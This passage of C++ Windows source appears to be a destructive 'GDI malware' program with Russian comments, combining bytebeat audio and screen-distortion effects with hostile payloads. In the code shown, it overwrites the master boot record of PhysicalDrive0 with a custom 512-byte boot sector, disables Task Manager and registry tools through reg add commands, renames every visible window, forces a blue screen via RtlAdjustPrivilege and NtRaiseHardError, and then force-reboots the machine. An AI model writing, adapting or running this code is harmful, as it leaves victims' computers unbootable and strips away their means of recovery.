    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase10Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase11Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase11Playing = false; return 0;
}

DWORD WINAPI ByteBeatPhase12Thread(LPVOID lpParam) {
    int sRate = 8000; int tSamples = sRate * 30; unsigned char* buf = new unsigned char[tSamples];
    for (int t = 0; t < tSamples; t++) buf[t] = (unsigned char)(t * (t >> 8 * (t >> 15 | t >> 8) & (20 | 5 ^ (t >> 19) >> t | t >> 3)));
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, (DWORD)sRate, (DWORD)sRate, 1, 8, 0 }; HWAVEOUT hOut; WAVEHDR hdr = { (LPSTR)buf, (DWORD)tSamples, 0, 0, 0, 0, NULL, 0 };
    waveOutOpen(&hOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL); waveOutPrepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutWrite(hOut, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(100); waveOutUnprepareHeader(hOut, &hdr, sizeof(WAVEHDR)); waveOutClose(hOut); delete[] buf; isPhase12Playing = false; return 0;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) SetWindowTextA(hwnd, "Cvh890"); return TRUE;
}
DWORD WINAPI WindowTitleSpammerThread(LPVOID lpParam) {
    while (isSoundPlaying) { EnumWindows(EnumWindowsProc, 0); Sleep(50); } return 0;
}
// ============================================================================
// ДЕСТРУКТИВНЫЙ БЛОК (П ПЕРЕЗАПИСЬ MBR И ИСПОРЧЕННЫЙ РЕЕСТР)
// ============================================================================
const unsigned char mbr_animation[512] = {
    0xFA, 0xB8, 0x00, 0x10, 0x8E, 0xD8, 0x8E, 0xC0, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB8, 0x13, 0x00,
    0xCD, 0x10, 0xBC, 0x00, 0x7C, 0x8E, 0xD0, 0xFB, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB, 0xBF,
    0x00, 0x00, 0xB9, 0x40, 0x3E, 0x31, 0xC0, 0xF3, 0xAB, 0x31, 0xC0, 0xBA, 0xC8, 0x03, 0xEE, 0x42,
    0xB9, 0x00, 0x03, 0x88, 0xC8, 0xEE, 0x31, 0xC0, 0xEE, 0x31, 0xC0, 0xEE, 0x40, 0xE2, 0xF3, 0xBA,
    0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0x31, 0xDB, 0xBA, 0xC8,
    0x03, 0x31, 0xC0, 0xEE, 0x42, 0xB9, 0x00, 0x01, 0x8A, 0xC1, 0x02, 0xC3, 0xEE, 0x31, 0xC0, 0xEE,
    0x31, 0xC0, 0xEE, 0xE2, 0xF1, 0x43, 0xEB, 0xE0, 0x23, 0xFF, 0x26, 0xFF, 0x29, 0xFF, 0x2D, 0xFF,
    0x55, 0xAA
};

void DestroyAndWriteMBR() {
    HANDLE hRawDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hRawDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten; WriteFile(hRawDisk, mbr_animation, 512, &bytesWritten, NULL); CloseHandle(hRawDisk);
    }
}

void LockSystemDefenses() {
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HDC hdc = NULL; HDC hdcCopy = NULL; HDC hdcMem7 = NULL; HDC hdcMem10 = NULL;
    BITMAPINFO bmpi = { 0 }; BITMAPINFO bmi7 = { 0 }; BITMAPINFO bmi10 = { 0 };
    RGBQUAD* rgbquad = NULL; RGBQUAD* rgbquad10 = NULL; PRGBQUAD_CHV rgbScreen7 = NULL;
    HBITMAP bmp = NULL; HBITMAP hbmTemp7 = NULL; HBITMAP bmp10 = NULL;
    HBITMAP hOldBmp = NULL; HBITMAP hOldBmp7 = NULL; HBITMAP hOldBmp10 = NULL;
    int sFrame = 0; int sFrame10 = 0; BYTE* rgbquad9Bytes = NULL;
    BOOLEAN bl; DWORD response; NRHEdef NtRaiseHardError = NULL; RAPdef RtlAdjustPrivilege = NULL;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    if (!ShowStartWarnings()) return 0;

    LockSystemDefenses();
    DestroyAndWriteMBR();

    w = GetSystemMetrics(SM_CXSCREEN); h = GetSystemMetrics(SM_CYSCREEN);
    isSoundPlaying = true; CreateThread(NULL, 0, WindowTitleSpammerThread, NULL, 0, NULL);

    // 1
    CreateThread(NULL, 0, ByteBeatPhase1Thread, NULL, 0, NULL);
    while (isSoundPlaying) { 
        hdc = GetDC(NULL); DrawDistortedCurves(hdc); FlyCursor(); DrawXorPlasma(hdc); DrawBouncingBittenCircle(hdc); 
        ReleaseDC(NULL, hdc); Sleep(5); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 2
    isPhase2Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase2Thread, NULL, 0, NULL);
    while (isPhase2Playing) { 
        hdc = GetDC(NULL); AdvancedScreenDistortion(hdc); ColorChannelHell(hdc); DrawIconsAndText(hdc); 
        if (phase2Time % 3 == 0) DrawFullscreenWidthXorPlasma(hdc); DrawFlyingMiniScreen(hdc); FlyCursor(); 
        if (phase2Time % 15 == 0) RefreshScreenClean();
        ReleaseDC(NULL, hdc); Sleep(15); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 3
    isPhase3Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase3Thread, NULL, 0, NULL);
    while (isPhase3Playing) { 
        hdc = GetDC(NULL); DrawPhase3ScreenGlitch(hdc); DrawPhase3TextOut(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(10); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 4
    isPhase4Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase4Thread, NULL, 0, NULL);
    hdc = GetDC(NULL); hdcCopy = CreateCompatibleDC(hdc); ReleaseDC(NULL, hdc);
    bmpi.bmiHeader.biSize = sizeof(bmpi); bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h; bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32; bmpi.bmiHeader.biCompression = BI_RGB;
    hdc = GetDC(NULL); bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0); ReleaseDC(NULL, hdc);
    hOldBmp = (HBITMAP)SelectObject(hdcCopy, bmp);
    while (isPhase4Playing) { 
        hdc = GetDC(NULL); DrawPhase4FractalShader(hdc, hdcCopy, rgbquad, sFrame); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(2); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) break; 
    }
    SelectObject(hdcCopy, hOldBmp); DeleteObject(bmp); DeleteDC(hdcCopy); RefreshScreenClean(); Sleep(1000);

    // 6
    isPhase6Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase6Thread, NULL, 0, NULL);
    while (isPhase6Playing) { 
        hdc = GetDC(NULL); DrawPhase6RotateAndZoom(hdc); for (int m = 0; m < 5; m++) DrawPhase6Mosaic(hdc); DrawPhase6BouncingCircle(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(5); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 7
    isPhase7Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase7Thread, NULL, 0, NULL);
    hdc = GetDC(NULL); hdcMem7 = CreateCompatibleDC(hdc); ReleaseDC(NULL, hdc);
    bmi7.bmiHeader.biSize = sizeof(bmi7); bmi7.bmiHeader.biBitCount = 32; bmi7.bmiHeader.biPlanes = 1; bmi7.bmiHeader.biWidth = w; bmi7.bmiHeader.biHeight = h;
    hdc = GetDC(NULL); hbmTemp7 = CreateDIBSection(hdc, &bmi7, DIB_RGB_COLORS, (void**)&rgbScreen7, NULL, NULL); ReleaseDC(NULL, hdc);
    hOldBmp7 = (HBITMAP)SelectObject(hdcMem7, hbmTemp7);
    while (isPhase7Playing) { 
        hdc = GetDC(NULL); DrawPhase7ColorShift(hdc, hdcMem7, rgbScreen7); DrawPhase7PlgBltStorm(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(5); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) break; 
    }
    SelectObject(hdcMem7, hOldBmp7); DeleteObject(hbmTemp7); DeleteDC(hdcMem7); RefreshScreenClean(); Sleep(1000);

    // 8
    isPhase8Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase8Thread, NULL, 0, NULL);
    while (isPhase8Playing) { 
        hdc = GetDC(NULL); DrawPhase8PatBlt(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(10); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 9
    hdc = GetDC(NULL); hdcCopy = CreateCompatibleDC(hdc); ReleaseDC(NULL, hdc);
    bmpi.bmiHeader.biSize = sizeof(bmpi); bmpi.bmiHeader.biWidth = w; bmpi.bmiHeader.biHeight = h; bmpi.bmiHeader.biPlanes = 1; bmpi.bmiHeader.biBitCount = 32; bmpi.bmiHeader.biCompression = BI_RGB;
    hdc = GetDC(NULL); bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad9Bytes, NULL, 0); ReleaseDC(NULL, hdc);
    hOldBmp = (HBITMAP)SelectObject(hdcCopy, bmp);
    isPhase9Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase9Thread, NULL, 0, NULL);
    while (isPhase9Playing) { 
        hdc = GetDC(NULL); DrawPhase9WaterMirrorShader(hdc, hdcCopy, rgbquad9Bytes); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(5); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) break; 
    }
    SelectObject(hdcCopy, hOldBmp); DeleteObject(bmp); DeleteDC(hdcCopy); RefreshScreenClean(); Sleep(1000);

    // 10
    isPhase10Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase10Thread, NULL, 0, NULL);
    hdc = GetDC(NULL); hdcMem10 = CreateCompatibleDC(hdc); ReleaseDC(NULL, hdc);
    bmi10.bmiHeader.biSize = sizeof(bmi10); bmi10.bmiHeader.biWidth = w; bmi10.bmiHeader.biHeight = h; bmi10.bmiHeader.biPlanes = 1; bmi10.bmiHeader.biBitCount = 32; bmi10.bmiHeader.biCompression = BI_RGB;
    hdc = GetDC(NULL); bmp10 = CreateDIBSection(hdc, &bmi10, DIB_RGB_COLORS, (void**)&rgbquad10, NULL, 0); ReleaseDC(NULL, hdc);
    hOldBmp10 = (HBITMAP)SelectObject(hdcMem10, bmp10);
    while (isPhase10Playing) { 
        hdc = GetDC(NULL); DrawPhase10WavyPlasma(hdc, hdcMem10, rgbquad10); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(5); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) break; 
    }
    SelectObject(hdcMem10, hOldBmp10); DeleteObject(bmp10); DeleteDC(hdcMem10); RefreshScreenClean(); Sleep(1000);

    // 11
    isPhase11Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase11Thread, NULL, 0, NULL);
    while (isPhase11Playing) { 
        hdc = GetDC(NULL); DrawPhase11ProfectStorm(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(10); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) goto exit_program; 
    }
    RefreshScreenClean(); Sleep(1000);

    // 12
    isPhase12Playing = true; isSoundPlaying = true; CreateThread(NULL, 0, ByteBeatPhase12Thread, NULL, 0, NULL);
    while (isPhase12Playing) { 
        hdc = GetDC(NULL); DrawPhase12SpamText(hdc); FlyCursor(); 
        ReleaseDC(NULL, hdc); Sleep(10); if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) break; 
    }
    isSoundPlaying = false; RefreshScreenClean(); Sleep(1000);

    NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtRaiseHardError");
    RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlAdjustPrivilege"); 
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
        NtRaiseHardError((NTSTATUS)0x00000890, 0, 0, 0, 6, &response);
    }
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);

exit_program:
    return 0;
}
